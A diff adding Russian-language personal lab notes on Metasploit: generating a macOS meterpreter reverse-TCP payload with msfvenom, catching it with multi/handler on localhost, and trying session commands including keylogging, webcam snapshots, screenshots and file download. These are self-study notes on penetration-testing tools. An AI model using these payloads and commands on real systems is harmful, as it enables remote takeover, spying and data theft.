@@ -488,5 +488,95 @@ Full Name — Полное имя модуля
     скрытые папки и даже нашли документацию API. Сайт друга оказался хорошо защищён: все интересные папки либо закрыты авторизацией, 
     либо защищены от перебора.
 
+    ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+    exploit/multi/handler ========== полезная нагрузка
+    ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+    создание payload (полезной нагрузки) 
+        msf > use exploit/multi/handler
+        msf > set PAYLOAD osx/aarch64/meterpreter_reverse_tcp
+        msf > set LHOST 127.0.0.1
+        msf > set LPORT 4444
+        msf > run -j
+
+    в другом терминале
+        сгенерировать файл stageless payload:
+            export PATH="/opt/homebrew/opt/ruby@3.3/bin:$PATH"
+            bundle exec ./msfvenom -p osx/aarch64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f macho -o /tmp/test_payload_stageless
+
+            нужно увидеть:
+                Payload size: XXXX bytes
+                Final size of macho file: XXXXX bytes
+                Saved as: /tmp/test_payload_stageless
+
+        заапустить:
+            chmod +x /tmp/test_payload_stageless
+            /tmp/test_payload_stageless
+
+    дальше в терминале msf нужно увидеть чтото подобное:
+        [*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:XXXXX)
+
+    в идиале увидеть это:
+        [*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:52523) at 2026-09-24 11:41:14 +0300
     
+    Это создание meterpreter сессии
+
+    можно проверить все активные jobs -l
+        msf exploit(multi/handler) > jobs -l
+
+        Jobs
+        ====
+
+        Id  Name                    Payload                              Payload opts
+        --  ----                    -------                              ------------
+        1   Exploit: multi/handler  osx/aarch64/meterpreter_reverse_tcp  tcp://127.0.0.1:4444
+        2   Exploit: multi/handler  osx/aarch64/meterpreter_reverse_tcp  tcp://127.0.0.1:4444
+
+    убить все лишние jobs -K
+
+    проверить все активные сессии sessions -l
+        можно увидеть чтото типа
+
+        Active sessions
+        ===============
+        Id  Name  Type                     Information          Connection
+        --  ----  ----                     -----------          ----------
+        1         meterpreter aarch64/osx  limitless @ MacBook  127.0.0.1:4444 -> 127.0.0.1:52523
+
+    и войти в сессию sessions -i 1
+    должны увидеть чтото типа 
+        meterpreter >
+
+    мы вошли в компутер по удаленному доступу
+    можно испытать такие команды
+        meterpreter > sysinfo       # Информация о системе
+        meterpreter > getuid        # Текущий пользователь
+        meterpreter > pwd           # Текущая директория
+        meterpreter > ls            # Список файлов
+        meterpreter > ps            # Список процессов
+        meterpreter > ipconfig      # Сетевые интерфейсы
+        meterpreter > help          # Все команды
+
+    Payload — файл, который запускается на цели
+    Handler — слушатель на твоей машине
+    Session — установленное соединение
+    Meterpreter — командный интерфейс внутри сессии
+
+    Ровно так же работают реальные пентесты, только payload доставляется через эксплойт (уязвимость), а не через ручной запуск
+
+    закрыть exit
+    а если нужно свернуть на фон bg (background)
+
+    так же можно попробыать такие комады как:
+        meterpreter > sysinfo          # Информация о системе
+        meterpreter > getuid           # Текущий пользователь
+        meterpreter > ps               # Процессы
+        meterpreter > screenshot       # Снимок экрана (может не работать на macOS без разрешений)
+        meterpreter > webcam_snap      # Снимок с веб-камеры (если есть)
+        meterpreter > keyscan_start    # Начать перехват нажатий клавиш
+        meterpreter > keyscan_dump     # Показать перехваченное
+        meterpreter > download /etc/hosts  # Скачать файл
+        meterpreter > upload /tmp/test.txt /tmp/  # Загрузить файл
+        meterpreter > shell            # Обычная командная оболочка
+        meterpreter > background       # Свернуть сессию (не закрывать!)
 */
